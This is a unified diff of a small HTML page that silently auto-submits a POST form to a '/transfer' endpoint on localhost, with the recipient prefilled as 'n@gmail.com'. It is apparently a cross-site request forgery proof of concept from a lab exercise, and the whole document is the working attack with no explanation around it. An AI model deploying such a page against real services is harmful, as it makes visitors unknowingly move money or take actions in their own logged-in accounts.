@@ -1,10 +1,6 @@
-<!DOCTYPE html>
+
 <html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Automatic Form Submission</title>
-</head>
+
 <body>
 <form id="transferForm" action="https://127.0.0.1:8080/transfer" method="POST">
     <input type="text" class="form-control" id="inputTo" name="user_to" placeholder="Who do you want to transfer to?" value="n@gmail.com"/>
@@ -12,9 +8,9 @@
 </form>
 
 <script>
-document.addEventListener('DOMContentLoaded', function() {
-    document.getElementById('transferForm').submit();
-});
+
+    document.getElementById('transferForm').submit()
+
 </script>
     
 </body>
